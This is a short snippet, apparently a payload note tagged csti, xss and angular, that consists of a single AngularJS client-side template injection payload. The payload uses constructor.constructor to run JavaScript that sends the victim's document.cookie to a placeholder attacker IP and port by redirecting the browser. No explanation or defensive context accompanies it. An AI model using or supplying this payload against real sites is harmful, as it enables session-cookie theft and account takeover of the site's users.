#csti #xss #angular

```js
{{constructor.constructor("window.location=`http://[ATTACKER_IP]:[ATTACKER_PORT]?c=${document.cookie}`")()}}

```